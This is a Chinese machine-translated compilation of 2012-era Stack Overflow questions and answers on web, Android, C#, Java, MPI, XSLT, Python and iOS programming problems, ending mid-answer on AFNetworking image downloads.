Re-read Cake's docs, as it does get confusing (even after years of Cake apps, I still need to refresh when I start a new project): [http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html)

# html - 有没有办法更改选定的 html 列表框项的默认颜色？

> ID：10078044
> 
> 赞同：5
> 
> 时间：2012-04-09T18:42:42.680
> 
> 标签：html, css, colors, listbox, listboxitem

好的，不确定这是否可能，但我想更改所选 HTML 列表框项的默认颜色。我不是在谈论列表框选项标签的背景颜色。这可以通过 CSS 来完成，我明白了。我说的是在选择项目时覆盖该背景颜色的颜色。在 Chrome、FF 和 IE 中，如果我只是将背景颜色更改为红色，然后从列表中选择项目，则颜色现在为蓝色。我似乎找不到任何关于是否可以覆盖颜色的信息，但我希望这里的人可能知道。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T18:49:26.983

不可靠。元素的`<select>`渲染由操作系统控制，所以它不是简单的样式。大多数尝试这样做的服务都使用 JS/HTML/CSS 来创建可以随意设置样式的伪元素，而不是真正`<select>`的。

一般来说，无论如何，出于用户体验的原因，我不建议对这个元素进行样式设置。用户需要看到 UI 元素以类似的方式表现和看待，以了解他们的目的和行为。覆盖默认行为可能会削弱这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T18:48:55.873

当我为选择框设置样式时，我使用 jQuery selected 并编辑 CSS

[http://harvesthq.github.com/chosen/](http://harvesthq.github.com/chosen/)

# c - 如何使具有两个线程的两个进程在 MPI 中相互接收、发送？

> ID：10078049
> 
> 赞同：0
> 
> 时间：2012-04-09T18:43:20.323
> 
> 标签：c, pthreads, mpi, distributed-computing, pvm

基本上我想实现这样的目标：

```
Process 1
  Thread 1
    Receive X from process 2
  Thread 2
    Receive Y from process 2
Process 2
  Thread 1
    Send X to process 1
  Thread 2
    Send Y to process 1 
```

在带有 pthreads 库的 C 语言的 MPI 中。
我已经在 PVM 中做到了，这里是源代码：
master.c：[http](http://pastebin.com/wwEie7gn) :
//pastebin.com/wwEie7gn，slave.c：[http](http://pastebin.com/gfeCkcss) ://pastebin.com/gfeCkcss 。
我试图做的事情：
prog.c : [http://pastebin.com/tCVKN3fe](http://pastebin.com/tCVKN3fe)
不知何故接收器线程没有收到任何东西。我不知道问题是什么。我希望有人能告诉我正确的方法。
我正在运行没有线程支持的 MPI 编译。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T19:07:52.703

您想对两条消息使用不同的标签，例如，您可以使用接收者线程的（已知？）ID 来标记消息。然后进程 1 中的每个线程将发布一个带有其 ID 作为标签的接收，并且该接收将仅匹配定向到该特定线程的消息。

请注意，MPI 2.2 提供与线程的有限互操作性。默认情况下，大多数 MPI 实现都不是线程安全的。例如，Open MPI 需要在配置期间显式启用完整的线程支持（默认情况下禁用）。您至少需要具有(or ) 的参数中`MPI_THREAD_SERIALIZED`返回的线程级别，以便能够在不同的线程中进行 MPI 调用。如果您的 MPI 库仅提供或级别，那么您很不走运，并且无法在主线程以外的地方进行 MPI 调用。如果提供的级别是`provided``MPI_Thread_init``MPI_Query_thread``MPI_THREAD_SINGLE``MPI_THREAD_FUNNELED``MPI_THREAD_SERIALIZED`，那么您可以从任何线程进行 MPI 调用，但是您必须显式地序列化调用，即确保没有两个或更多调用是同时进行的（例如，使用关键部分或互斥锁）。如果提供的级别是，`MPI_THREAD_MULTIPLE`那么您将拥有完整的多线程支持，并且可以在任何时间点从任何线程进行 MPI 调用。

# asp.net-mvc - 如何找到与 url 匹配的路由？

> ID：10078050
> 
> 赞同：0
> 
> 时间：2012-04-09T18:43:20.670
> 
> 标签：asp.net-mvc, asp.net-mvc-3

如何在 ASP.NET MVC 中找到与字符串 url 匹配的路由？

这不是为了调试。

我正在生成一个链接，`Request.UrlReferrer`但我们需要将其限制为我们应用程序中的特定控制器操作。理想情况下，我们会这样：

```
@Url.PreviousUrl(
    default: Url.Action("index", "home")
    validRoutes: new[] { 
        new { controller = "list", "projects" }
        new { controller = "tagged", "projects" },
        new { controller = "details", "category" }
    }
); 
```

如果`UrlReferrer`匹配任何这些路由，那么我们将重定向到它，否则我们将重定向到指定的默认 url。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T18:54:31.540

您可以按如下方式调用 GetRouteData。可能有更好的方法，但我在单元测试中使用过类似的方法

[http://bradwilson.typepad.com/blog/2010/07/testing-routing-and-url-generation-in-aspnet-mvc.html](http://bradwilson.typepad.com/blog/2010/07/testing-routing-and-url-generation-in-aspnet-mvc.html)

# android - 检测蓝牙连接（android sdk ICS）

> ID：10078051
> 
> 赞同：1
> 
> 时间：2012-04-09T18:43:22.490
> 
> 标签：android, bluetooth, android-4.0-ice-cream-sandwich

我想构建一个小应用程序，它将识别任何蓝牙耳机连接和断开连接并将其写入日志文件。

我尝试使用[android SDK 示例](http://developer.android.com/guide/topics/wireless/bluetooth.html#Profiles)来检测蓝牙连接，但它不起作用。当我的应用程序正在加载时，我收到了对 OnServiceConnected 的调用，仅此而已。当我通过蓝牙耳机连接和断开连接时，没有其他对 OnServiceConnected 或 OnServiceDisconnected 的呼叫（我累了不止一个）。

我在 OnCreate 函数中编写了所有代码。

也许问题出在android 4上？或者是别的什么？

```
// Get the default adapter
BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();

// Establish connection to the proxy.
mBluetoothAdapter.getProfileProxy(this.getApplicationContext(), mProfileListener, BluetoothProfile.HEADSET);

private BluetoothProfile.ServiceListener mProfileListener = new BluetoothProfile.ServiceListener() {
    public void onServiceConnected(int profile, BluetoothProfile proxy) {
       // Write to log - OnServiceConnected
    }
    public void onServiceDisconnected(int profile) {
       // Write to log - OnServiceDisconnected 
    }
}; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-17T13:53:31.043

好的，找到了。

就这个：

```
getApplicationContext().registerReceiver(receiver,
                    new IntentFilter(BluetoothDevice.ACTION_ACL_CONNECTED));
getApplicationContext().registerReceiver(receiver,
                    new IntentFilter(BluetoothDevice.ACTION_ACL_DISCONNECTED));

private final BroadcastReceiver mReceiver = new BroadcastReceiver()
    {
        @Override
        public void onReceive(Context context, Intent intent)
        {
            if (BluetoothDevice.ACTION_ACL_CONNECTED.equals(action))
            {
                // LOG - Connected
            }
            else if (BluetoothDevice.ACTION_ACL_DISCONNECTED.equals(action))
            {
                // LOG - Disconnected
            }
        }
    } 
```

# c# - 如何在多线程应用程序中使用相同的登录会话

> ID：10078052
> 
> 赞同：0
> 
> 时间：2012-04-09T18:43:26.190
> 
> 标签：c#, multithreading

假设我有一个服务需要登录才能访问它。有一个功能：

```
void Login(LoginInfo info); 
```

它实现了服务的登录逻辑。还有一个功能：

```
void RequestServiceToDoSomething(RequestInfo info); 
```

Login 函数发送凭据并检索随后由每个 RequestServiceToDoSomething 使用的 SessionId。如果由于某种原因 SessionId 变得无效，则 RequestServiceToDoSomething 会引发异常。

当您必须处理一个单线程时，这非常简单。当多个线程想要使用相同的 SessionId 来执行请求时，就会出现问题。

到目前为止，我对这个问题的处理是这样的：

```
class Foo {
...
private object SessionId;
private DateTime LastSuccessfullLogin;
private const int LoginValidPeriod = 5;
...
public void Login(LoginInfo) 
{
    lock (LastSuccessfullLogin) {
        if ((DateTime.Now - LastSuccessfullLogin).Seconds < LoginValidPeriod)
           return; 
    }
    lock (Logging) {
        if (Logging == true)
           return;
        else
           Logging = true;
        AquireWriteLock();  
    }
    try {
    // DO STUFF THAT UPDATE SessionId
         lock (LastSuccessfullLogin) {
               LastSuccessfullLogin  = DateTime.Now;
         }
    }
    finally {
       lock (Logging) {
            Logging = false;
       } 
       ReleaseWriteLock();
    }
}

...
void RequestServiceToDoSomething(RequestInfo info) {
    try {
     AquiareReadLock();
     // DO REQUEST BASED ON SessionId
    }
    finally {
        ReleaseWriteLock();
    }
} 
```

我的问题是 LastSuccessfullLogin 检查是否是必要的，并且这种模式是否可以防止不必要的登录执行。有没有更高效、更直接的模式？

PS 提供的代码在语法和句法上并非 100% 正确，但您明白了。

# java - 如何评估变量

> ID：10078055
> 
> 赞同：0
> 
> 时间：2012-04-09T18:43:44.587
> 
> 标签：java

如何评估java变量？我有几个字符串 String q1,q2,q3,q4,q5

```
for(i=1;i1<=5;i++){
//evaluate the value of q1,q2,q3,q4,q5 
system.out.println(q+i); //should print q1,q2,q3,q4,q5 values concurrently
} 
```

请帮我。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T18:46:48.107

使用数组：

```
 String[] q = {q1, q2, q3, q4, q5};
 for (String s : q) 
    System.out.println(s); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:48:00.477

我相信他指的是来自 flash 的 actionscript 和 javascript 的 eval 函数。

有了它，您可以执行以下操作

```
for (i = 1; i <= 4; i++){
     eval("func" + i + "( )");
} 
```

它将调用 func1()、func2()、func3()、func4()。同样，您可以使用字符串变量来执行此操作。

您不能在 Java 中执行此操作，如果您觉得必须使用 for 循环打印这些单独的变量，那么您最好的选择是[Eugene 的答案](https://stackoverflow.com/a/10078088/786250)，即首先将它们放入数组中。

编辑：我正在输入我的答案，并没有注意到拉文德的答案。感谢您的参考。我以前从未使用过 ScriptEngine，因此必须检查一下。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T18:45:37.117

您可以使用 java 反射来检查类中定义的字段。

例如`Class.getField(String)`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T19:34:42.457

看来您正`Java`试图`eval`在`JavaScript`.
如果是，那么[在 Java 中使用 eval 的](https://stackoverflow.com/questions/2605032/using-eval-in-java)答案可能会对您有所帮助。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T18:51:06.040

此代码无法编译，您尝试打印的内容是变量 q 的值，随着 i 的值递增。没有 q，你也不想要 i 的值。

请改用 Eugene Retunsky 的解决方案。

# svn - 用 eclipse 创建新的 svn 项目

> ID：10078063
> 
> 赞同：0
> 
> 时间：2012-04-09T18:45:10.683
> 
> 标签：svn, eclipse-plugin

我正在svn中进行现有项目。将其导入eclipse。然后断开这个项目与 svn 服务器的连接。然后尝试将此项目放回不同文件夹下的 svn 中。本质上，我正在尝试创建该项目的第二个副本。

它似乎按预期运行，但是在我选择共享项目后，项目中的所有项目都显示一个问号（在 Eclipse 中），但如果我通过 Web 浏览器浏览目录，则只有顶层项目文件夹出现在 svn 中。

可能是什么问题？我应该在哪里查找任何错误消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T18:50:35.913

为什么不在 Subversion 中制作副本然后检查副本？

```
svn cp svn+ssh://path/to/project svn+ssh://path/to/copy/of/project
svn co svn+ssh://path/to/copy/of/project 
```

# android - Android CoverFlow 显示文本而不是图像

> ID：10078068
> 
> 赞同：2
> 
> 时间：2012-04-09T18:45:42.780
> 
> 标签：android, coverflow

在我的一个应用程序中，我需要从数据库中读取文本并将其显示给用户。为此，我想到了使用 Coverflow。那么这里的任何人都可以告诉我，是否可以使用 CoverFlow 而不是图像来显示文本？我正在尝试生成与[此类](http://code.google.com/p/android-coverflow/)似的输出。按照建议，我将文本转换为位图图像并尝试显示它。但我得到了空白屏幕。请在下面查看我的代码

```
public class CoverFlowDemoActivity extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        CoverFlow coverFlow;
        coverFlow = new CoverFlow(this);

        coverFlow.setAdapter(new ImageAdapter(this));

        ImageAdapter coverImageAdapter = new ImageAdapter(this);

        coverFlow.setAdapter(coverImageAdapter);

        coverImageAdapter.populateBitmapArray();

        coverFlow.setSpacing(-25);
        coverFlow.setSelection(4, true);
        coverFlow.setAnimationDuration(1000);

        setContentView(coverFlow);
    }

    public class ImageAdapter extends BaseAdapter {
        int mGalleryItemBackground;
        private Context mContext;

        private Bitmap[] bitmapImages;

        public ImageAdapter(Context c) {
            mContext = c;
            bitmapImages = new Bitmap[9];
        }

        public void populateBitmapArray() {

            for (int i = 0; i < 9; i++) {
                Bitmap originalImage = textAsBitmap("Example Test", 50f,
                        R.color.red);
                bitmapImages[i] = originalImage;
            }

        }

        public int getCount() {
            return 9;
        }

        public Object getItem(int position) {
            return position;
        }

        public long getItemId(int position) {
            return position;
        }

        public View getView(int position, View convertView, ViewGroup parent) {

            // Use this code if you want to load from resources
            ImageView i = new ImageView(mContext);
            i.setImageBitmap(bitmapImages[position]);
            i.setLayoutParams(new CoverFlow.LayoutParams(130, 130));
            i.setScaleType(ImageView.ScaleType.CENTER_INSIDE);

            // Make sure we set anti-aliasing otherwise we get jaggies
            BitmapDrawable drawable = (BitmapDrawable) i.getDrawable();
            drawable.setAntiAlias(true);

            return i;

            // return mImages[position];
        }

        /**
         * Returns the size (0.0f to 1.0f) of the views depending on the
         * 'offset' to the center.
         */
        public float getScale(boolean focused, int offset) {
            /* Formula: 1 / (2 ^ offset) */
            return Math.max(0, 1.0f / (float) Math.pow(2, Math.abs(offset)));
        }

        public Bitmap textAsBitmap(String text, float largest, int textColor) {
            Paint paint = new Paint();
            paint.setTextSize(largest);
            paint.setColor(textColor);
            // int width = (int) (paint.measureText(text) + 0.5f); // round

            int width = 500;

            float baseline = (int) (paint.ascent() + 0.5f) + 3f;
            // int height = (int) ((baseline + paint.descent() + 0.5f) + 3);

            int height = 500;
            Bitmap image = Bitmap.createBitmap(width, height,
                    Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(image);
            canvas.drawText(text, 0, baseline, paint);
            return image;

        }

    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-28T06:14:25.417

我一直在做和你类似的事情。我意识到你是在你的形象之外画画。

要解决此问题，只需将“基线”更改为“250”，您就会看到您的文本为图像。

例如：

改变

```
canvas.drawText(text, 0, baseline, paint); 
```

至

```
canvas.drawText(text, 0, 250, paint); 
```

希望这对你有帮助

# c++ - tr1/正则表达式的问题。打印相反的结果

> ID：10078070
> 
> 赞同：4
> 
> 时间：2012-04-09T18:45:50.993
> 
> 标签：c++, regex, tr1

知道为什么下面的代码会打印“***不匹配***”吗？与编译器或库版本有关的东西？我用 g++ a.cpp 编译。

```
#include <tr1/regex>
#include <iostream>
#include <string>

using namespace std;

int main()
{
   const std::tr1::regex pattern("(\\w+day)");

   std::string weekend = "Saturday and Sunday";

   std::tr1::smatch result;

   bool match = std::tr1::regex_search(weekend, result, pattern);

   if(match)
   {
      for(size_t i = 1; i < result.size(); ++i)
      {
         std::cout << result[i] << std::endl;
      }
   }else
    std::cout << "no match" << std::endl;

   return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:21:42.883

您是否尝试过转义 ()。在某些正则表达式实现中，您必须`\(`用于分组。无论如何，您可能不需要它。

最基本的正则表达式是：

```
"[a-zA-Z]+day" 
```

你会得到结果`result[0]`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T01:23:56.877

绝对是您的编译器的问题。我建议（因为您使用的是 Linux，这使得它特别容易）简单地`<tr1/regex>`换成`<boost/regex.hpp>`. 命名空间也变为`boost::`代替，`std::tr1::`但所有其他语法完全相同，它可以解决您的所有问题。

如果你不能使用 boost，那就完全不同了。但在过去一年左右的时间里，大多数人/雇主/公司都对提升更加友好。

另请注意，您的测试用例存在缺陷。你有一个循环，但它只会打印一个值。`regex_search`一次返回一个值，您需要使用新的搜索开始索引继续调用它以获取所有结果。如果您说程序的输出什么都没有（与“不匹配”相比），那么我会说错误在您的代码中。但是*当前编写*的代码应该返回`"Saturday"`or `""`。

# xcode - iTunesConnect 版本控制

> ID：10078074
> 
> 赞同：0
> 
> 时间：2012-04-09T18:46:01.537
> 
> 标签：xcode, ios4, ios5, app-store-connect

我想知道我是否上传了一个适用于 ios 4.2 的应用程序，然后一旦它发布，上传一个适用于 ios 5.0 的相同应用程序的更新，其中包含 ios 5.0 的特定功能，然后它就被发布了。ios 4.2 的用户即使下载不了，也会提示有新版本吗？对于那些使用 4.2 并且尚未下载该应用程序的人来说，该 4.2 版本是否不再在应用商店中可见？

我问这个是因为我创建的应用程序一直是 4.2 以获得大量下载，但我希望发布一个只有 ios 5 具有但不想失去所有那些 4.2 下载器的应用程序所以我想要有一个4.2版本和一个5.0版本，这可能吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T16:16:22.280

是的，iOS 4.2 用户将被提示下载新版本，该版本无法在他们的设备上运行。iOS 4.2 将不再可供下载。

您可以将仅 iOS 5 的功能集成到 iOS 4.2 应用程序中，这些功能是可选的，并且仅显示在安装了 iOS 5 的设备上。

# c# - C# XSLT 删除节点

> ID：10078081
> 
> 赞同：0
> 
> 时间：2012-04-09T18:46:24.560
> 
> 标签：c#, xslt

有人可以帮我解决这个问题。我需要在 C# 中删除节点 "xsl:variable" ，如您所见，这里有两个带有子元素 xsl:variable 的 xsl:template 节点。在此示例中，我需要使用 C# 将其删除。

像这样的东西：

```
XmlDocument d = new XmlDocument();
d.Load("MyFileName.Xml");
XmlNode t = d.SelectSingleNode("/navigation/page[@id='1']");
t.ParentNode.RemoveChild(t);
d.Save(); 
```

但我无法将 'xsl:variable' 的路径获取到 d.SelectSingleNode()

请帮我 ？

这是 XSLT：

```
<xsl:template name="Aggregate:RealECBooleanToXMLBoolean">
        <xsl:param name="RealECBoolean" select="/.."/>
        <xsl:variable name="var1_result">
            <xsl:value-of select="($RealECBoolean = 'Yes')"/>
            <xsl:value-of select="($RealECBoolean = 'YES')"/>
            <xsl:value-of select="($RealECBoolean = 'X')"/>
        </xsl:variable>
        <xsl:variable name="var2_resultof_any" select="boolean(translate(normalize-space($var1_result), 'false0 ', ''))"/>
        <xsl:choose>
            <xsl:when test="string((string((string($var2_resultof_any) != 'false')) != 'false')) != 'false'">
                <xsl:value-of select="(string((string($var2_resultof_any) != 'false')) != 'false')"/>
            </xsl:when>
            <xsl:otherwise>
                <xsl:value-of select="false()"/>
            </xsl:otherwise>
        </xsl:choose>
    </xsl:template>
    <xsl:template name="Aggregate:LookupRECodeName">
        <xsl:param name="RECode" select="/.."/>
        <xsl:call-template name="vmf:vmf1_inputtoresult">
            <xsl:with-param name="input" select="$RECode"/>
        </xsl:call-template>
    </xsl:template> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:52:58.593

这是一个想法。我不确定在使用 SelectNodes 时是否需要“xsl”名称空间，您必须对此进行试验。

公共无效 YouMethod() {

```
XmlDocument doc = new XmlDocument();
doc.Load("your.xsl");

XmlNode root = doc.DocumentElement;

// iterate the template nodes
foreach (XmlNode tNode in root.SelectNodes("//xsl:template"))
{
  // iterate the variable child nodes
  foreach (XmlNode vNode in tNode.SelectNodes("xsl:variable"))
  {
      tNode.RemoveChild(vNode);
  } 
}

doc.Save(); 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T22:38:28.410

您需要传递`SelectNodes`或`SelectSingleNode`定义`xsl`前缀的名称空间管理器：

```
XmlNamespaceManager namespaceManager = new XmlNamespaceManager(xDoc.NameTable);
namespaceManager.AddNamespace("xsl" , "http://www.w3.org/1999/XSL/Transform"); 
```

进而：

```
XmlNode variableNode = xDoc.SelectSingleNode("//xsl:variable", namespaceManager); 
```

将选择第一个`xsl:variable`元素，或

```
XmlNodeList variableNodes = xDoc.SelectNodes("//xsl:variable", namespaceManager); 
```

将选择所有`xsl:variable`元素

# python - 使用python将列表添加到csv文件中的位置

> ID：10078082
> 
> 赞同：0
> 
> 时间：2012-04-09T18:46:24.823
> 
> 标签：python

我对修改 csv 文件相当陌生，但我需要将一个列表作为一行添加到文件中的特定位置，例如位置 H。我最初打开一个文件进行读取，然后将其设置为一个变量，长度为该变量将我列表的第 i 个元素附加到该文件或列表的位置 H。不过，我对执行此操作感到非常困惑，因此将不胜感激任何人的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T18:51:23.787

您可以将 CSV 作为行列表读取并插入新行，然后将该列表作为新的 CSV 文件输出。

```
lines = csv.read('my_file.csv')
lines.insert(rowIndex, newRow)
csv.write(lines, 'my_new_file.csv') 
```

那是伪代码，但它应该是这样工作的。

# jquery - 如何使用 $.ajax() jquery 发送多个数据

> ID：10078085
> 
> 赞同：47
> 
> 时间：2012-04-09T18:46:35.313
> 
> 标签：jquery, ajax

我正在尝试使用 j 查询 $.ajax 方法向我的 php 脚本发送多个数据，但是当我连接多个数据时我只能传递单个数据我在我的 php 脚本中得到未定义的索引错误，这意味着发出了 ajax 请求但数据不是发送我需要知道我应该如何格式化多个数据以连续将其发送到名称 vale 对中的处理脚本这是我写的

```
<script>
  $(document).ready(function() {

    $('#add').click(function () {

      var name = $('#add').attr("data_id");

      var id = $('#add').attr("uid");

      var data = 'id='+ id  & 'name='+ name; // this where i add multiple data using  ' & '

      $.ajax({
        type:"GET",
        cache:false,
        url:"welcome.php",
        data:data,    // multiple data sent using ajax
        success: function (html) {

          $('#add').val('data sent sent');
          $('#msg').html(html);
        }
      });
      return false;
    });
  });
</script>

<span>
  <input type="button" class="gray_button" value="send data" id="add" data_id="1234" uid="4567" />
</span>
<span id="msg"></span> 
```

* * *

## 回答 #1

> 赞同：101
> 
> 时间：2012-04-09T18:48:44.320

您可以创建一个键/值对对象，然后 jQuery 将为您完成剩下的工作：

```
$.ajax({
    ...
    data : { foo : 'bar', bar : 'foo' },
    ...
}); 
```

这样，数据将自动正确编码。如果您确实想编造自己的字符串，请确保使用`encodeURIComponent()`：[https ://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/encodeURIComponent](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/encodeURIComponent)

您当前的代码无法正常工作，因为字符串未正确编写：

```
'id='+ id  & 'name='+ name 
```

应该：

```
'id='+ encodeURIComponent(id) + '&name='+ encodeURIComponent(name) 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-04-09T18:50:26.617

改变`var data = 'id='+ id & 'name='+ name;`如下，

改用这个.....

```
var data = "id="+ id + "&name=" + name; 
```

这将正常工作:)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-04-09T18:48:27.827

```
var data = 'id='+ id  & 'name='+ name; 
```

与号也需要引用：

```
var data = 'id='+ id  + '&name='+ name; 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2014-08-26T21:43:17.033

```
var my_arr = new Array(listingID, site_click, browser, dimension);
    var AjaxURL = 'http://example.com';
    var jsonString = JSON.stringify(my_arr);
    $.ajax({
        type: "POST",
        url: AjaxURL,
        data: {data: jsonString},
        success: function(result) {
            window.console.log('Successful');
        }
    }); 
```

这已经为我工作了很长一段时间。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-04-09T18:51:14.657

我建议使用哈希而不是参数字符串：

```
data = {id: id, name: name} 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2013-10-13T18:51:21.187

```
var value1=$("id1").val();
var value2=$("id2").val();
data:"{'data1':'"+value1+"','data2':'"+value2+"'}" 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-09-04T15:07:12.620

您可以使用`FormData`

看看我的 MVC 片段

```
var fd = new FormData();
fd.append("ProfilePicture", $("#mydropzone")[0].files[0]);// getting value from form feleds 
d.append("id", @(((User) Session["User"]).ID));// getting value from session

$.ajax({
    url: '@Url.Action("ChangeUserPicture", "User")',
    dataType: "json",
    data: fd,//here is your data
    processData: false,
    contentType: false,
    type: 'post',
    success: function(data) {}, 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-04-21T11:16:38.760

```
var CommentData= "u_id=" + $(this).attr("u_id") + "&post_id=" + $(this).attr("p_id") + "&comment=" + $(this).val(); 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2017-05-24T06:42:52.703

```
 var value1=$("id1").val();
  var value2=$("id2").val();
    data:"{'data1':'"+value1+"','data2':'"+value2+"'}" 
```

您可以使用这种方式传递数据

# python - 每4个标签写一个新行文本文件python

> ID：10078086
> 
> 赞同：2
> 
> 时间：2012-04-09T18:46:35.500
> 
> 标签：python

如果我有以下由标签分隔打印的数据，使用

```
print str(z).translate(None,"([]){},\"'").replace(' ','\t')

0.016611783537845426    0.5728972505882961  0.1723653381777387   0.44730982873820446    10  11  10  0.016611783537845426     0.5728972505882961 0.2526385373738682  0.03281263933004819 10  12  10  0.016611783537845426    0.5728972505882961  0.509414248773428 
```

我如何写入一个新的 txt 文件，但每说 4 个标签就开始新行。所以得到4列。

已经尝试了许多 \n 但我 rubbsih 的变体。

例如：

```
 open("file.txt", "w").write('\n'.join(str(z).translate(None,"([]){},\"'").replace(' ','\t'))) 
```

为每个字符返回一个换行符。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T18:52:05.263

您可以使用[文档](http://docs.python.org/library/itertools.html#recipes)`grouper`中的配方：[`itertools`](http://docs.python.org/library/itertools.html#recipes)

```
import itertools as it
def grouper(n, iterable, fillvalue=None):
    "grouper(3, 'ABCDEFG', 'x') --> ABC DEF Gxx"
    args = [iter(iterable)] * n
    return it.izip_longest(fillvalue=fillvalue, *args) 
```

然后您可以将输出生成为：

```
values = str(z).translate(None,"([]){},\"'").split()
output = '\n'.join('\t'.join(x for x in g if x) for g in grouper(4, values)) 
```

或者，如果要将其写入文件，请使用`f.writelines`：

```
f.writelines('\t'.join(x for x in g if x) + '\n' for g in grouper(4, values)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:18:02.107

这应该有效：

```
text = str(z).translate(None,"([]){},\"'").replace(' ','\t')

# convert to list
x = text.split()
# group by four items
x = [x[0::4],x[1::4],x[2::4],x[3::4]]
# convert back to text lines
print "\n".join(" ".join(i) for i in [x[0::4],x[1::4],x[2::4],x[3::4]]) 
```

# ios - 用于图像下载的 AFNetworking，无响应的 UI

> ID：10078092
> 
> 赞同：1
> 
> 时间：2012-04-09T18:47:02.553
> 
> 标签：ios, multithreading, core-data, thread-safety, afnetworking

我正在使用 AFNetworking 从 URL 中提取图像、调整大小、存储到磁盘并在 Core Data 中记录路径，然后加载到表视图并存储。当代码执行时，它会冻结我的 UI。我不确定是下载还是操纵导致了我的麻烦。

我正在使用的代码如下

```
- (void)getPhoto:(NSInteger)type forManagedObject:(MyManagedObject*)object {

    // download the photo
    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:object.photoUrl]];
    AFImageRequestOperation *operation = [AFImageRequestOperation imageRequestOperationWithRequest:request success:^(UIImage *image) {

        // MyManagedObject has a custom setters (setPhoto:,setThumb:) that save the
        // images to disk and store the file path in the database 
        object.photo = image;
        object.thumb = [image imageByScalingAndCroppingForSize:CGSizeMake(PhotoBlockCellButtonWidth, PhotoBlockCellButtonHeight)];

        NSError *nerror;
        if (![[DataStore sharedDataStore].managedObjectContext save:&nerror]) {
            NSLog(@"Whoops, couldn't save: %@", [nerror localizedDescription]);
            return;
        }

        // notify the table view to reload the table
        [[NSNotificationCenter defaultCenter] postNotificationName:@"ReloadTableView" object:nil];

    }];
    [operation start];
}
```

这是与我的托管对象中的设置器相关的示例代码

```
- (NSString*)uniquePath{

    // prepare the directory string
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];

    // acquire a list of all files within the directory and loop creating a unique file name
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSArray *existingFiles = [fileManager contentsOfDirectoryAtPath:documentsDirectory error:nil];
    NSString *uniquePath;
    do {
        CFUUIDRef newUniqueId = CFUUIDCreate(kCFAllocatorDefault);
        CFStringRef newUniqueIdString = CFUUIDCreateString(kCFAllocatorDefault, newUniqueId);

        uniquePath = [[documentsDirectory stringByAppendingPathComponent:(__bridge NSString *)newUniqueIdString] stringByAppendingPathExtension:@"png"];

        CFRelease(newUniqueId);
        CFRelease(newUniqueIdString);
    } while ([existingFiles containsObject:uniquePath]);

    return uniquePath;
}

- (NSString*)saveImage:(UIImage*)image{
    NSString *path = [self uniquePath];
    NSData *data = UIImagePNGRepresentation(image);
    [data writeToFile:path atomically:YES];
    return [NSString stringWithFormat:@"file://%@",path];
}

- (void) setPhoto:(UIImage *)image {
    self.photoUrl = [self saveImage:image];
}
```

我想将此推送到后台线程，但我不确定 AFNetworking、核心数据和消息传递在线程安全方面的含义。任何想法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:10:19.753

AFAIK，您执行请求的方式不正确：

```
[operation start]; 
```

您应该改为将操作添加到`NSOperationQueue`：

```
 NSOperationQueue* operationQueue = [[NSOperationQueue alloc] init];
    [operationQueue addOperation:operation]; 
```

（您应该正确地对队列进行内存管理）。

通过这样做，您的请求将以异步方式执行，它不会阻塞 UI，您也不需要处理多线程。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-23T19:37:32.807

根据马特的建议，我通过修改我的调用来改进 UI，如下所示。

```
- (void)getPhoto:(NSInteger)type forManagedObject:(MyManagedObject*)object {

    // download the photo
    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:object.photoUrl]];
    AFImageRequestOperation *operation = [AFImageRequestOperation 
        imageRequestOperationWithRequest:request 
        imageProcessingBlock:^UIImage *(UIImage *image) {
            return [image imageByScalingAndCroppingForSize:CGSizeMake(PhotoBlockCellButtonWidth, PhotoBlockCellButtonHeight)];
        } 
        cacheName:nil 
        success:^(NSURLRequest *request, NSHTTPURLResponse *response, UIImage *image) {

            // MyManagedObject has a custom setters (setPhoto:,setThumb:) that save the
            // images to disk and store the file path in the database 
            object.photo = image;
            object.thumb = image;

            NSError *nerror;
            if (![[DataStore sharedDataStore].managedObjectContext save:&nerror]) {
